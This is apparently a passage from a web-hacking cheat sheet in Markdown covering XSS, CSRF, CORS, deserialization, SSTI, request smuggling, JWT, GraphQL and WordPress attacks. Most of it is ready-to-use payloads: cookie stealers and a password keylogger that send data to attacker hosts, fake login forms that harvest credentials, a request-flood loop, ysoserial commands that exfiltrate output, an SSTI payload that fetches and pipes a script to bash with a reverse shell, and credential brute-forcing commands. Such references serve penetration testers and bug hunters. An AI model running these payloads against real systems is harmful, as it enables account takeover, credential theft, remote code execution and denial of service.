- [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
- [XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
- [How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)

### Tools
- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
  - [python3 version](https://github.com/L1NT/xsscrapy)
- [KNOXSS](https://knoxss.me/)
- [DalFox](https://github.com/hahwul/dalfox)

### Resources
- For blind XSS
- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
- [XSS Hunter](https://xsshunter.com/)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
- [Weaponised XSS payloads](https://github.com/hakluke/weaponised-XSS-payloads)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
- [JSCompress](https://jscompress.com/)

### Bypasses
- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
- [JSFuck](http://www.jsfuck.com/)
- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
- Short XSS payloads
  ```
  <svg/onload=alert()>
  <script/src=//⑮.rs
  ```
- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)

### CSP
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
- [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
- [CSP Bypass](https://github.com/PortSwigger/csp-bypass)

### Blind XSS
- Insert a payload in the User-Agent, try with the match/replace rule
- Other endpoints: pending review comments, feedback

### Swagger XSS
- https://github.com/swagger-api/swagger-ui/issues/1262
- https://github.com/swagger-api/swagger-ui/issues/3847<br/>
  `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS/swag-test.json`
- [Hacking Swagger-UI - from XSS to account takeovers](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)<br/>
  `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUy9zd2FnLXRlc3QueWFtbCIKfQo=`
- Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`

### Carriage Return Line Feed (CRLF) injection
- `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`

### Payloads

- HTML injection
  - Steal credentials
    ```HTML
    <form action="http://malicious-website.com/steal-credentials" method="post"><label for="username">Username:</label><input type="text" id="username" name="username"><br><label for="password">Password:</label><input type="password" id="password" name="password"><br><input type="submit" value="Log In"></form>
    ```
  - ```HTML
    <div style="background-color:white;position:fixed;width:100%;height:100%;top:0px;left:0px;z-index:1000;margin: auto;padding: 10px;"><p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a></div>
    ```
  - ```HTML
    <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
    ```
- [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
  - See also this article: ["Exploiting XSS in hidden inputs and meta tags" by Gareth Heyes](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)
- For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
- [XSS Without parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- iframe + base64 encoded SVG 
  ```HTML
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
  ```
- Small SVG base64
  ```HTML
  data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
  ```
- Cookie stealers
  - ```JavaScript
    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
    ```
  - ```JavaScript
    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
    ```
  - ```HTML
    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
    ```
- Keylogger [[Reference](https://hackerone.com/reports/2010530)]
  ```
  setTimeout(function () {
    a = document.getElementsByName('password')[0];
    b = document.getElementsByName('email')[0];
    function f() {
      fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
    }
    a.form.onclick=f;
    a.onchange=f;
    b.onchange=f;
    a.oninput=f;
    b.oninput=f;
  }, 1000)
  ```
- Unusual events
  - `onpointerrawupdate` (Chrome only)
  - `onmouseleave`
- Can't use `alert`, `confirm` or `prompt`?
  - Try `print()` [[Reference](https://portswigger.net/research/alert-is-dead-long-live-print)] and / or `import()`
  - If `console.log()` doesn't work, try `console.info()` and [other variants](https://developer.mozilla.org/en-US/docs/Web/API/console)
- For a `_blank` page, try with `javascript:alert(window.parent.document.cookie)`
- This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
  ```JavaScript
  for(;;){fetch('https://VICTIM/',{method:'GET'});}
  for (;;) Promise.all(Array.from({ length: 20 }, () => fetch("https://VICTIM", { method: "GET" })));
  ```
- ```HTML
  data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
  ```
  - For the challenge [5Ways2XSS - DOJO #23 | YesWeHack](https://dojo-yeswehack.com/practice/d5e8e5ddf9af)
- [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
  - `<iframe src="https://VICTIM.net/#" onload=this.src='http://ATTACKER/?x='+document.cookie;></iframe>`
  - `<iframe src="https://VICTIM.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
- [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
  ```HTML
  <a href=jav%26%23x61%3bscript:alert()>
  ```
- AngularJS
  - `{{$on.constructor('alert(1)')()}}`
- [AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings): `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
- [AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp): `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
- Steal values from inputs
  ```HTML
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
  ```
- XSS to CSRF
  ```HTML
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script>
  ```
- From [@kinugawamasato](https://x.com/kinugawamasato/status/1816234368714871185)
  ```HTML
  <input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
  <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
  ```
- XSS to Form Hijacking
  ```JavaScript
  document.forms['form1'].action = 'https://ATTACKER';
  ```

**Misc payloads**
```HTML
" onload=alert() alt="
<img src=x onerror=alert()>
javascript:alert(document.cookie)
%253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
<a href="jAvAsCrIpT:alert(1)">payload</a>
%22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
<svg/onload=alert(0)>
<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
%22-alert(document.cookie)-%22
%00%22%3E%3Cimg%20src%3da%20onerror%3dconfirm(document.domain)%3E
<><img src=x onerror=alert()>
<body onresize=print() onload=this.style.width='100px'>
<xss id=x onfocus=alert(document.cookie) tabindex=1>
"><svg><animatetransform onbegin=alert(1)>
http://foo?&apos;-alert(1)-&apos;
${alert(1)}
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
<button popovertarget=x>CLICKME</button><input type="text" readonly="readonly" id="x" popover onbeforetoggle=window.location.replace('http:attacker.com') />
javascript://redacted.com%0aalert(1)
```

### XSS -> ATO Escalation [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
- Change email > Password reset
- Change phone number > SMS password reset
- Add SSO (Google, Github etc.)
- Add authentication method (email, sms etc.) > Password reset
- Change password
- Change security questions
- Cross Site Tracing: If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. [[Reference](https://owasp.org/www-community/attacks/Cross_Site_Tracing)]
- Steal Cookies
- Steal API key
- Add admin user to the application
- Hijack oAuth flow and steal code
- Steal SSO code to adjacent app, then reverse SSO back to main app

Some examples
- [yelp.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530)


## Cross-site request forgery (CSRF)

- Remove the entire token
- Use any random but same-length token, or `same-length+1`/`same-length-1`
- Use another user's token
- Change from `POST` to `GET` and delete the token
- If it's a `PUT` or `DELETE` request, try `POST /profile/update?_method=PUT` or
  ```HTTP
  POST /profile/update HTTP/1.1
  Host: vuln.com
  ...
  
  _method=PUT
  ```
- If the token it's in a custom header, delete the header
- Change the `Content-Type` to `application/json`, `application/x-url-encoded` or `form-multipart`, `text/html`, `application/xml`
- If there is double submit token, try CRLF injection
- Bypassing referrer check
  - If it's checked but only when it exists, add to the PoC `<meta name="referrer" content="never">` 
  - Regex Referral bypass
    ```
    - https://attacker.com?victim.com
    - https://attacker.com;victim.com
    - https://attacker.com/victim.com/../victimPATH
    - https://victim.com.attacker.com
    - https://attackervictim.com
    - https://victim.com@attacker.com
    - https://attacker.com#victim.com
    - https://attacker.com\.victim.com
    - https://attacker.com/.victim.com
    ```
- CSRF token stealing via XSS/HTMLi/CORS
- JSON based
  - Change the `Content-Type` to `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`
  - Use flash + 307 redirect
- Guessable CSRF token
- Clickjacking to strong CSRF token bypass
- Type juggling
- Use array, from `csrf=token` to `csrf[]=token`
- Set the CSRF token to null or add null bytes
- Check whether CSRF token is sent over http or sent to 3rd party
- Generate multiple CSRF tokens, pick the static part. Play with the dynamic part

**Simple PoC**
```HTML
<form method="POST" action="https://VICTIM/my-account/settings/change-email">
        <input type="hidden" name="email" value="user1%40evil.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

**Resources**
- [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)
  - Add `<script>document.forms[0].submit();</script>` to the PoC


## Cross-origin resource sharing (CORS)

**Classic CORS vulnerability**
```HTML
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://<TARGET-URL>',true);
	req.withCredentials = true;
	req.send();
		
	function reqListener() {
		alert(this.responseText);
	};
</script>
```

**CORS vulnerability with null origin**
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','https://<TARGET-URL>',true);
		req.withCredentials = true;
		req.send();
		
		function reqListener() {
			alert(this.responseText);
		};
	</script>">
</iframe>
```


**Resources**
- [Corsy](https://github.com/s0md3v/Corsy) Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations
- [What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cors)


## Clickjacking

**Classic PoC**
```HTML
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Click me button</div>
<iframe src="$url"></iframe>
```

**Resources**
- [What is Clickjacking? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/clickjacking)
- [MetaMask - stealing ETH by exploiting clickjacking - $120,000 bug bounty](https://www.youtube.com/watch?v=HnI0w156rtw)
- [Bsides Tallinn 2024 - Lyra Rebane (Web security is fun)](https://www.youtube.com/watch?v=2ZENE8ua_gU)
- [The Ultimate Double-Clickjacking PoC | Jorian Woltjer](https://jorianwoltjer.com/blog/p/research/ultimate-doubleclickjacking-poc)
- [Clipjacking: Hacked by copying text - Clickjacking but better](https://blog.jaisal.dev/articles/cwazy-clipboardz)

## DOM-based vulnerabilities

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location
- document.cookie
- document.referrer
- window.name
- history.pushState
- history.replaceState
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

| DOM-based vulnerability          | Example sink               |
| -------------------------------- | -------------------------- |
| DOM XSS                          | document.write()           |
| Open redirection                 | window.location            |
| Cookie manipulation              | document.cookie            |
| JavaScript injection             | eval()                     |
| Document-domain manipulation     | document.domain            |
| WebSocket-URL poisoning          | WebSocket()                |
| Link manipulation                | someElement.src            |
| Web-message manipulation         | postMessage()              |
| Ajax request-header manipulation | setRequestHeader()         |
| Local file-path manipulation     | FileReader.readAsText()    |
| Client-side SQL injection        | ExecuteSql()               |
| HTML5-storage manipulation       | sessionStorage.setItem()   |
| Client-side XPath injection      | document.evaluate()        |
| Client-side JSON injection       | JSON.parse()               |
| DOM-data manipulation            | someElement.setAttribute() |
| Denial of service                | RegExp()                   |


## WebSockets

Any web security vulnerability might arise in relation to WebSockets:
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques;
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Cross-site WebSocket hijacking (CSRF missing)**
```HTML
<script>
  websocket = new WebSocket('wss://websocket-URL');
  websocket.onopen = start;
  websocket.onmessage = handleReply;
  function start(event) {
    websocket.send("READY");
  }
  function handleReply(event) {
    fetch('https://your-domain/?'+event.data, {mode: 'no-cors'});
  }
</script>
```



## Insecure deserialization

How to spot Insecure deserialization
- PHP example
  `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
- Java objects always begin with the same bytes 
  - Hex `ac` `ed`
  - Base64 `rO0`
 - .NET vulnerable deserarilaztion libraries: BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter
 - BinaryFormatter serialized objects usually starts with `AAEAAAD`

**Ysoserial**

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-RATOR-ID>.burpcollaborator.net' | gzip | base64
```

Other options
- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "id"`
  - See [this](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)

**Ysoserial.net**

Windows Defender might tag the application as virus.

```
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c 'whoami | curl --data-binary @- http://yourcollaboratorserver' -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

**PHPGGC**

[PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.

**Burp extensions**
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
- [GadgetProbe](https://portswigger.net/bappstore/e20cad259d73403bba5ac4e393a8583f)
- [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
- [PHP Object Injection Check](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7)

**Resources**
- [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)


## Server-side template injection (SSTI)

Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.

The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.

Some payloads:
```C#
{{7*7}}[[3*3]]
{{7*7}}
{{7*'7'}}
<%= 7 * 7 %>
${7*7}
${{7*7}}
@(7+7)
#{7*7}
#{ 7 * 7 }
```

Python
- try then `{{config}}` and `{{{{{}.__class__.__base__.__subclasses__()}}}}`
- `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl 192.168.45.237/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
  - shell.sh
    ```bash
    bash -i >& /dev/tcp/192.168.118.9/8080 0>&1
    ```

Razor
- [Server-Side Template Injection (SSTI) in ASP.NET Razor | Clément Notin | Blog](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
- Payload: `@(191*7)`
- Open a web server: `@{ var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "powershell"; p.StartInfo.Arguments = "-Command \"Start-Process powershell -ArgumentList 'cd C:\\; python -m http.server 9999'\""; p.Start(); }`

## Web cache poisoning

**Constructing a web cache poisoning attack**
 1. Identify and evaluate unkeyed inputs
 2. Elicit a harmful response from the back-end server
 3. Get the response cached

**Cache key flaws**
Many websites and CDNs perform various transformations on keyed components when they are saved in the cache key:
- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

**Cache probing methodology**<br/>
 1. Identify a suitable cache oracle
    - Simply a page or endpoint that provides feedback about the cache's behavior. This feedback could take various forms, such as: An HTTP header that explicitly tells you whether you got a cache hit, Observable changes to dynamic content, Distinct response times
 2. Probe key handling
    - Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.
 3. Identify an exploitable gadget
    - These techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched.



## HTTP Host header attacks

- "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
- Carriage Return Line Feed (CRLF) injection: "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]


## HTTP request smuggling

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
- Content-Length
  ```HTTP
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 11
  q=smuggling
  ```
- Transfer-Encoding
  ```HTTP
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Transfer-Encoding: chunked
  b
  q=smuggling
  0
  ```
  
Example
```HTTP
POST / HTTP/1.1
Host: smuggle-vulnerable.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Result: GPOST request
- Some servers do not support the Transfer-Encoding header in requests;
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

Ways to obfuscate the Transfer-Encoding header
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked`
- `Transfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- ```
  Transfer-Encoding
  : chunked
  ```

Confirming CL.TE vulnerabilities using differential responses
```HTTP
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

Result
```HTTP
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Impact
- Bypass front-end security controls
- Revealing front-end request rewriting
- Capturing other users' requests
- Using HTTP request smuggling to exploit reflected XSS
- Turn an on-site redirect into an open redirect<br/>
  Example of 301 in Apache and IIS web servers
  ```HTTP
  GET /home HTTP/1.1
  Host: normal-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://normal-website.com/home/
  ```
  Vulnerable request
  ```HTTP
  POST / HTTP/1.1
  Host: vulnerable-website.com
  Content-Length: 54
  Transfer-Encoding: chunked
  
  0
  
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: X
  ```
  Result
  ```HTTP
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: XGET /scripts/include.js HTTP/1.1
  Host: vulnerable-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://attacker-website.com/home/
  ```
- Perform web cache poisoning
- Perform web cache deception

**Resource**
- [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)



## JWT Attacks

A JWT consists of a `header`, a `payload`, and a `signature`. Each part is separated by a dot.<br/>
 
Common attacks
- Accepting tokens with no signature
- Brute-forcing secret keys using [hashcat](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat)
  - You need a valid JWT and a [wordlist](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
  - `hashcat -a 0 -m 16500 <jwt> <wordlist>`
  - If any of the signatures match, hashcat will give you an output like this `<jwt>:<identified-secret>` along with other details
  - Once identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. See [Signing JWTs](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#signing-jwts)
- Injecting self-signed JWTs via the `jwk`, `jku` or `kid` parameter
- Change Content-Type in `cty` to achieve XXE and deserialization attacks
- `x5c` (X.509 Certificate Chain) can lead to [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633/)
- [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

**Resources**
- [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
- [Checklist](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)



## OAuth authentication

How OAuth 2.0 works:
- `Client application` The website or web application that wants to access the user's data;
- `Resource owner` The user whose data the client application wants to access;
- `OAuth service provider` The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

**[OAuth flow](https://portswigger.net/web-security/oauth/grant-types)**

<img src="img/oauth-authorization-code-flow.jpg" alt="oauth-flow">

Following standard endpoints:
- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Vulnerabilities in the client application
- Improper implementation of the implicit grant type
- Flawed CSRF protection

Vulnerabilities in the OAuth service
- Leaking authorization codes and access tokens
- Flawed scope validation
- Unverified user registration



## GraphQL

To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.

**GraphQL Introspection query**

```JSON
{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```JSON
{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

```JSON
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
```



## WordPress

- Information Disclosure [high]: `/_wpeprivate/config.json`
- Data exposure:
  - `/wp-json/wp/v2/users/`
  - `/wp-json/th/v1/user_generation`
  - `/?rest_route=/wp/v2/users`
- Register:
  - `http://192.168.157.166/wp-login.php?action=register`
  - `http://192.168.157.166/wp-signup.php`
- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```
- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with
  - `wpscan --url <domain> --enumerate u` enumerate users
  - `wpscan --url <domain> -U users.txt -P password.txt` try to find valid credentials
